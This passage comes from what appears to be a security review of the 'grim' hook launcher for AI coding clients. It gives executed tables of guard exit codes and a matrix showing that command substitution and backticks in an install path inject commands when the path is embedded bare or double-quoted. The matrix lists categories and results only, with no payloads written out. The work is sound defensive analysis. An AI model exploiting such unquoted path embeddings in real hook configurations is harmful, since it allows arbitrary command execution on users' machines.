   rationale, and `matcher_char_allowed` is the membership test rather than the range spelling. The
   only gap is that a build-time cap does not bind a file on disk (W2).
8. **`exit 0` is the right degrade code on all three v1 clients.** Copilot requires it (fail-closed),
   Claude and Codex are fail-open, and an exit-0-with-empty-stdout is "no opinion" on each (WP-B
   § 2.1–2.3, executed). The design's fail-safe direction is right; B8 is about the codes the guard
   *cannot currently prevent*, not about this choice.

---

# Appendix A — guard-shape × launcher-state matrix (executed)

`/bin/sh` → `dash` (`lrwxrwxrwx 1 root root 4 Feb 2 2026 /bin/sh -> dash`). Three guard shapes:
`plan` = C-008 verbatim; `isfile` = `[ -f ] && [ -x ]` then `exec`; `remap` = `isfile` without
`exec`, mapping 126/127 → 0.

```
  absent       plan     exit=0
  absent       isfile   exit=0
  absent       remap    exit=0

  dirL         plan     exit=126  /bin/sh: 3: exec: …/dirL: Permission denied
  dirL         isfile   exit=0
  dirL         remap    exit=0

  nonexec      plan     exit=0            (mode 0644 — the C-019 OCI-fetch case)
  nonexec      isfile   exit=0
  nonexec      remap    exit=0

  badsheb      plan     exit=127  /bin/sh: 3: exec: …/badsheb: not found
  badsheb      isfile   exit=127
  badsheb      remap    exit=0

  noexecfmt    plan     exit=126  (ENOEXEC — not an executable format)
  noexecfmt    isfile   exit=126
  noexecfmt    remap    exit=0

  xonly        plan     exit=2    /bin/sh: 0: cannot open …/xonly   ← 2 is Claude's DENY code
  xonly        isfile   exit=2
  xonly        remap    exit=2

  dangling     plan     exit=0
  dangling     isfile   exit=0
  dangling     remap    exit=0

  good         plan     exit=0    OK-RAN
  good         isfile   exit=0    OK-RAN
  good         remap    exit=0    OK-RAN

  verdict2     plan     exit=2            (a deliberate verdict — preserved by all three)
  verdict2     isfile   exit=2
  verdict2     remap    exit=2
```

Cross-shell check of the two states the shipped flow produces (`absent`): `/bin/sh`, `/bin/bash`,
`/bin/dash`, `/bin/zsh` all `exit=0`.

# Appendix B — path-embedding matrix (executed)

Each row builds the command string grim would write, then runs it under `dash`. `side=RAN!` means a
side-effect file was created by the *path literal*, i.e. injection.

```
GRIM_HOME      embedding            exit   side   stdout/stderr (first line)
space          bare                 0      -      /bin/sh: 1: home/hooks/bin/grim-hook: not found
space          double-quoted        0      -      LAUNCHER-RAN argv=[run --client copilot …]
space          single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

single-quote   bare                 2      -      /bin/sh: 4: Syntax error: Unterminated quoted string
single-quote   double-quoted        0      -      LAUNCHER-RAN argv=[…]
single-quote   single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

dollar-brace   bare                 0      -
dollar-brace   double-quoted        0      -             ← path rewritten, launcher never ran
dollar-brace   single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

cmd-subst      bare                 0      RAN!
cmd-subst      double-quoted        0      RAN!          ← INJECTION, launcher never ran
cmd-subst      single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

backtick       bare                 0      RAN!
backtick       double-quoted        0      RAN!          ← INJECTION
backtick       single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

newline        bare                 0      RAN!   /bin/sh: 3: :/hooks/bin/grim-hook: not found
newline        double-quoted        0      -      LAUNCHER-RAN argv=[…]
newline        single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

semicolon      bare                 0      -      touch: cannot touch '…'
semicolon      double-quoted        0      -      LAUNCHER-RAN argv=[…]
semicolon      single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]

backslash      bare                 0      -
backslash      double-quoted        0      -
backslash      single-quoted(shlex) 0      -      LAUNCHER-RAN argv=[…]
```

# Appendix C — reproduction

Session-local, not committed:
`…/scratchpad/guard.sh` (E1 first pass), `…/scratchpad/guard2.sh` (Appendix A),
`…/scratchpad/quoting.py` (Appendix B).

```sh
/bin/sh …/guard2.sh                 # guard-shape matrix
python3 …/quoting.py                # embedding matrix
# E3, against the shipped release binary:
GRIM_HOME=.devcontainer/tools/grim  target/release/grim context --global --format json
env -u HOME -u GRIM_HOME            target/release/grim context --global --format json
```

# Appendix D — where each required change lands

| Finding | Contract to edit | WP |
|---|---|---|
| B1 | C-006 (table located by argv, not env), C-007 (no `env::grim_home()`, source-level test), C-008 (`--table` in argv), install-time refusal | **WP-I** |
| B2 | C-008 (single-quoted assignment), C-018b (widened to any non-grim-chosen value) | **WP-I** |
| B3 | C-006 (opaque root token), C-007 (argv is untrusted), C-008 (`--root <token>`) | **WP-I** |
| B8, W1, W2, W3, W4 | C-006, C-008, C-017 | **WP-I** |
| B4, B5, B6, B7 | C-022 (precedence table, identity matching, `Option<bool>`, drop `GRIM_ALLOW_HOOKS`) | **WP-G** |
| W5, W6, W7, W8 | C-022, C-023, C-026 | **WP-G** |
| W9 | C-008 / amendment A5 (drop the `$PATH` fallback) | **WP-I** |
| S1, S2, S3 | C-008, C-017 | **WP-I** |

B7 also touches `src/command/add.rs`'s serializer, `RegistryField::ALL`, and the field count in
`.claude/rules/subsystem-cli-commands.md` — all three in WP-G's commit, or the tripwire test fails.
